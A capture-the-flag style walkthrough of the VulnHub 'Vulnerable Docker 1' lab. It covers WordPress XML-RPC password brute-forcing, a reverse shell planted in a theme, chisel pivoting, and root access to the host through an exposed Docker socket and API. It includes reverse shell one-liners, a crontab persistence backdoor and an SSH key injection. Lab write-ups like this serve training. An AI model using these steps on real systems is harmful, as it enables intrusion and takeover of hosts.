---
title: VulnHub - Vulnerable Docker 1
author: ret2x
date: 2023-09-05 12:00:00 +0800
categories: [Walkthrough, VulnHub]
tags: [vulnhub, wordpress, docker]
image:
    path: /assets/images/vulndocker/front.png
---

**Description:** This is a linux machine that has two difficulty levels hard/easy, I have started with the hard level, in which you have to exploit a Wordpress CMS to get the first foothold, and to get root privileges you have to apply port forwarding and exploit a misconfigured container. The easy level is practically the same, whit the only difference is that there is to interact remotely with a Docker service, and find the way to gain root access to the host machine.

**Author:** NotSoSecure

**Operating System:** Linux

**Download:** [https://www.vulnhub.com/entry/vulnerable-docker-1,208/](https://www.vulnhub.com/entry/vulnerable-docker-1,208/)

# Hard Level
## Information Gathering
### Host Discovery

Verify if there is connectivity with the target host.

```console
root@parrot:~$ ping -c 1 192.168.142.133
PING 192.168.142.133 (192.168.142.133) 56(84) bytes of data.
64 bytes from 192.168.142.133: icmp_seq=1 ttl=64 time=1.27 ms

--- 192.168.142.133 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1.270/1.270/1.270/0.000 ms
```

### Port Scanning

The full TCP port scan found two open ports.

```
root@parrot:~$ nmap -n -v -p- -T4 -Pn 192.168.142.133
...
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt
```

### Service Enumeration

The aggressive scan with nmap detected on port 22 OpenSSH 6.6p1, and on port 8000 Apache httpd 2.4.10, which is serving Wordpress 4.8.1.

```console
root@parrot:~$ nmap -n -p22,8000 -v -A 192.168.142.133 -Pn
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6p1 Ubuntu 2ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 45130881706d46c350ed3cabaed6e185 (DSA)
|   2048 4ce72b0152161d5c6b099d3d4bbb7990 (RSA)
|   256 cc2f62714cea6ca6d8a74feb822a22ba (ECDSA)
|_  256 73bfb4d6ad51e3992629b742e3ffc381 (ED25519)
8000/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-generator: WordPress 4.8.1
```

## Enumeration
### Web Enumeration

It is verified that Wordpress is running on the web server.

![](/assets/images/vulndocker/screenshot-1.png)

When scanning the Wordpress CMS, it detected that it has the XMLRPC feature enabled, and an available user.

```console
root@parrot:~$ wpscan --url http://192.168.142.133:8000/ -e vt,vt,u
...
[+] XML-RPC seems to be enabled: http://192.168.142.133:8000/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
...
[+] bob
 | Found By: Author Posts - Author Pattern (Passive Detection)
 ...
```

Download the following script to perform a dictionary attack against the XMLRPC feature.

```console
git clone https://github.com/ret2x-tools/xmlrpc-brute-force.git
```

Run the script as follows:

```console
root@parrot:/scripts$ python XmlRpcbf.py -u http://192.168.142.133:8000/ -l bob -P /opt/SecLists-master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt -t 10
Success => bob:Welcome1
```

Sign in with the credentials found above.

![](/assets/images/vulndocker/screenshot-2.png)

![](/assets/images/vulndocker/screenshot-3.png)

## Exploitation
### Editing a Wordpress Theme

Click **Appearance -> Themes**, click on **404 Template**, write a reverse shell, and click **Upload File.**

![](/assets/images/vulndocker/screenshot-4.png)

Start a netcat listener on port 443, and request an inexistent web resource.

```console
root@parrot:~$ curl -s "http://192.168.142.133:8000/xd"
```

```console
root@parrot:~$ nc -vlnp 443
listening on [any] 443 ...
connect to [192.168.142.1] from (UNKNOWN) [192.168.142.133] 46891
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@8f4bca8ef241:/var/www/html$ 
```

Upgrade to a full TTY shell.

```console
www-data@8f4bca8ef241:/var/www/html$ script -qc /bin/bash /dev/null
script -qc /bin/bash /dev/null
www-data@8f4bca8ef241:/var/www/html$ ^Z
zsh: suspended  nc -vlnp 443
root@parrot:~$ stty raw -echo;fg
[1]  + continued  nc -vlnp 443

www-data@8f4bca8ef241:/var/www/html$ export TERM=screen
www-data@8f4bca8ef241:/var/www/html$ stty rows 41 columns 164
www-data@8f4bca8ef241:/var/www/html$
```

With the following commands we verify that we are inside a docker container.

```console
www-data@8f4bca8ef241:/var/www/html$ hostname
8f4bca8ef241
www-data@8f4bca8ef241:/var/www/html$ ls -la / | head -n 4
total 72
drwxr-xr-x  71 root root 4096 Aug 22  2017 .
drwxr-xr-x  71 root root 4096 Aug 22  2017 ..
-rwxr-xr-x   1 root root    0 Aug 22  2017 .dockerenv
```

Enumerating the target machine, a network interface was detected, that is connected to the **172.18.0.4/16** subnet.

```console
www-data@8f4bca8ef241:/var/www/html$ ip a | grep eth0
9: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    inet 172.18.0.4/16 scope global eth0
```

As the pentesting tools are not available on target machine, we can use bash to continue with the enumeration process on the subnet.

The following bash one-line ping scan found four active hosts.

```console
www-data@8f4bca8ef241:/tmp$ for n in $(seq 1 254); do timeout 0.2 ping -c 1 172.18.0.$n 2>&1 >/dev/null && echo "Host 172.18.0.$n up"; done
Host 172.18.0.1 up
Host 172.18.0.2 up
Host 172.18.0.3 up
Host 172.18.0.4 up
```

I have wrote a simple bash script to find open ports.

```console
#!/usr/bin/env bash

for port in $(seq 1 65535); do
  echo -n 2>/dev/null < /dev/tcp/$1/$port && echo "$port/tcp open"
done
```

To transfer the bash script, start an HTTP server on attack machine.

```console
root@parrot:~$ python -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

On compromised machine, download the script.

```console
www-data@8f4bca8ef241:/tmp$ curl -s 192.168.142.1:8000/portscan.sh -o portscan.sh
```

Run the script, and enter as argument each host detected as active.

```console
www-data@8f4bca8ef241:/tmp$ bash portscan.sh 172.18.0.1
22/tcp open
8000/tcp open
www-data@8f4bca8ef241:/tmp$ bash portscan.sh 172.18.0.2
3306/tcp open
www-data@8f4bca8ef241:/tmp$ bash portscan.sh 172.18.0.3
22/tcp open
8022/tcp open
www-data@8f4bca8ef241:/tmp$ bash portscan.sh 172.18.0.4
80/tcp open
52464/tcp open
```

The previous scan discovered several open ports, port 8022 on 172.18.0.3 looks interesting. To interact with this service it is necessary to use port forwarding.

**Reverse Port Forwarding**

Download chisel from its repository.

```console
root@parrot:~$ git clone https://github.com/jpillora/chisel.git
```

Move to the chisel directory, enter the following commands to build it, and use **upx** to compress it reducing its size.

```console
root@parrot:/chisel$ go build -ldflags="-s -w"
root@parrot:/chisel$ ls -lh chisel 
-rwxr-xr-x 1 root root 8.1M Dec 22 10:38 chisel
root@parrot:/chisel$ upx ./chisel
root@parrot:/chisel$ ls -lh chisel 
-rwxr-xr-x 1 root root 3.3M Dec 22 10:38 chisel
```

On attack machine, start an HTTP server.

```console
root@parrot:~$ python -m http.server -d chisel
```

On compromised machine, download the chisel binary.

```console
www-data@8f4bca8ef241:/tmp$ curl -s 192.168.142.1:8000/chisel -o chisel
```

On attack machine, set a chisel server.

```console
root@parrot:~$ ./chisel server -p 8000 --reverse
```

On compromised machine set a chisel client. This will open a listener on port 8022 on attacking machine, and all traffic to that port will be forwarded to the target port 8022 on 172.18.0.3.

```console
www-data@8f4bca8ef241:/tmp$ ./chisel client 192.168.142.1:8000 R:8022:172.18.0.3:8022
```

Check that the port 8022 is open on attacking machine.

```console
root@parrot:~$ ss -antl | grep 8022
LISTEN 0      4096               *:8022            *:*
```

Browsing the service on port 8022, was discovered a command execution utility.

Start a netcat listener on attacking machine on port 443, and executes the bash reverse shell.

![](/assets/images/vulndocker/screenshot-5.png)

```console
root@parrot:~$ nc -vlnp 443
listening on [any] 443 ...
connect to [192.168.142.1] from (UNKNOWN) [192.168.142.133] 54079
root@13f0a3bb2706:/# 
```

Enumerating the container, the **docker.sock** file was found in the **/run** directory, this file is usually used by the docker client to communicate with the docker daemon.

```console
root@13f0a3bb2706:~# find / -name 'docker.sock'
/run/docker.sock
```

As the socket client is not available on compromised machine, a static binary was downloaded.

```console
root@parrot:~$ wget https://download.docker.com/linux/static/stable/x86_64/docker-17.03.0-ce.tgz
```

Transfer the socket client compressed to the compromised machine.

Set the following command on the attacking machine.

```console
root@parrot:~$ nc -vlnp 8888 < docker-17.03.0-ce.tgz
```

On compromised machine run the following command:

```console
root@13f0a3bb2706:/tmp# cat < /dev/tcp/192.168.142.1/8888 > docker-17.03.0-ce.tgz
```

Extract the compressed file.

```console
root@13f0a3bb2706:/tmp# tar xvf docker-17.03.0-ce.tgz
```

Listing the docker images on target host.

```console
root@13f0a3bb2706:/tmp/docker# ./docker images
REPOSITORY                 TAG                 IMAGE ID            CREATED             SIZE
wordpress                  latest              c4260b289fc7        6 years ago         406 MB
mysql                      5.7                 c73c7527c03a        6 years ago         412 MB
jeroenpeeters/docker-ssh   latest              7d3ecb48134e        6 years ago         43.2 MB
```

## Privilege Escalation
### Mounting the Host Filesystem in the Docker Container

The following command mounts the host file system **/** to the **/mnt** directory in the wordpress container.

```console
root@13f0a3bb2706:/tmp/docker# ./docker run -v /:/mnt --rm -it wordpress chroot /mnt sh
# whoami
root
```

To gain access to the main host, we can use many techniques, at this occasion we set a cron job that executes a bash reverse shell every minute.

```console
# echo "* * * * * root bash -c 'bash -i >& /dev/tcp/192.168.142.1/443 0>&1'" >> /etc/crontab
```

Set a netcat listener on port 443, and every minute you get a root shell.

```console
root@parrot:~$ nc -vlnp 443
listening on [any] 443 ...
connect to [192.168.142.1] from (UNKNOWN) [192.168.142.133] 58185
bash: cannot set terminal process group (5202): Inappropriate ioctl for device
bash: no job control in this shell
root@vulndocker:~# whoami
whoami
root
```

# Easy Level
## Information Gathering
### Port Scanning

Since the easy mode is practically the same than the hard mode, I have simplified the exploitation process, and we will focus on exploit the docker container that is available from outside.

The following port scan with nmap reveals a docker service listening on port 2375.

```console
root@parrot:~$ nmap -n -v -p- -T4 -Pn 192.168.142.133
...
PORT     STATE SERVICE
22/tcp   open  ssh
2375/tcp open  docker
8000/tcp open  http-alt
```

### Service Enumeration

The service enumeration reveals practically the same in relation with the previous scan, the difference lies in the results obtained on the new port found 2375, it is docker version 17.06.0-ce.

```console
root@parrot:~$ nmap -n -v -p22,2375,8000 -A 192.168.142.133 -Pn
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6p1 Ubuntu 2ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 45130881706d46c350ed3cabaed6e185 (DSA)
|   2048 4ce72b0152161d5c6b099d3d4bbb7990 (RSA)
|   256 cc2f62714cea6ca6d8a74feb822a22ba (ECDSA)
|_  256 73bfb4d6ad51e3992629b742e3ffc381 (ED25519)
2375/tcp open  docker  Docker 17.06.0-ce
| docker-version: 
|   BuildTime: 2017-06-23T21:17:13.228983331+00:00
|   Arch: amd64
|   KernelVersion: 3.13.0-128-generic
|   ApiVersion: 1.30
|   Os: linux
|   GoVersion: go1.8.3
|   MinAPIVersion: 1.12
|   Version: 17.06.0-ce
|_  GitCommit: 02c1d87
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 404 Not Found
|     Content-Type: application/json
|     Date: Fri, 22 Dec 2023 04:13:19 GMT
|     Content-Length: 29
|     {"message":"page not found"}
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Api-Version: 1.30
|     Docker-Experimental: false
|     Ostype: linux
|     Server: Docker/17.06.0-ce (linux)
|     Date: Fri, 22 Dec 2023 04:13:19 GMT
|     Content-Length: 0
|     Content-Type: text/plain; charset=utf-8
|   docker: 
|     HTTP/1.1 400 Bad Request: missing required Host header
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request: missing required Host header
8000/tcp open  http    Apache httpd 2.4.10 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: NotSoEasy Docker &#8211; Just another WordPress site
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.10 (Debian)
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-generator: WordPress 4.8.1
```

## Enumeration
### Docker Enumeration

Enumerating the docker service, we list the docker images.

```console
root@parrot:~$ docker -H 192.168.142.133:2375 images
REPOSITORY                 TAG       IMAGE ID       CREATED       SIZE
wordpress                  latest    c4260b289fc7   6 years ago   406MB
mysql                      5.7       c73c7527c03a   6 years ago   412MB
jeroenpeeters/docker-ssh   latest    7d3ecb48134e   6 years ago   43.2MB
```

## Exploitation
### Mounting the Host File System in the Docker Container

The following command mounts the host file system **/** to the **/mnt** directory in the jeroenpeeters/docker-ssh container.

```console
root@parrot:~$ docker -H 192.168.142.133:2375 run -v /:/mnt --rm -it jeroenpeeters/docker-ssh chroot /mnt sh
# whoami
root
```

To do it a little different the access to the main host, by listing the ssh configuration file, the root log in without password is available.

```console
# grep -i 'permitrootlogin' /etc/ssh/sshd_config
PermitRootLogin without-password
```

## Privilege Escalation
### Access via SSH

Generate the ssh key pair.

```console
root@parrot:~$ ssh-keygen -P "" -f id_rsa
```

Copy the public key to the **/root/.ssh/authorized_keys** file.

```console
# echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCnOHwfvhPMRZdC7+5YusQFZ51oLpjVyrCXiL/FZBpm10BdKvmMtg6XP68ws25BPwddXMLXdPbEzwq+bJd05vJ1sGOsYTfTn+j9o+c1VMpbfb2r4W7qGg4R9EchLvUMAKa218MygDV5reByIOMOIu63Su9MZhEjcG2V4W6l7R1JwQ2jPFx+Lx514riFPE2+l/hx4Fc/i9E7PCepOF1nn7Ir+/ZoOOp/OmjUY2XDcHGkKtHh9B3LyfsmeEqHciJuzNdLk2nfRlIfWMq7E89z8Zd8aom96XPuLTYYzBsGcvvUSx0PJRvg9tBHSo88kxkOuWjUIGa+sQw8qdlVjIz0ymSicVMewO51lu14n/YTnP3MAyOdrGlxhUMbJ2RqglkEDQUYCjThFD7vtAnz/ebkTDxx+fTjejyLEsK764JcdFZb+UuZdmQMnzfAm4J2FbDz/Wi9s2PcUMuo+sWESUbv38yehOVpDJ3mgGH7CdAtmsLmNXynEWg3vDHJbRWvuBA8Tos=' >> /root/.ssh/authorized_keys
```

Then, SSH to the target machine.

```console
root@parrot:~$ ssh -l root 192.168.142.133 -i id_rsa
...
root@vulndocker:~# whoami
root
```
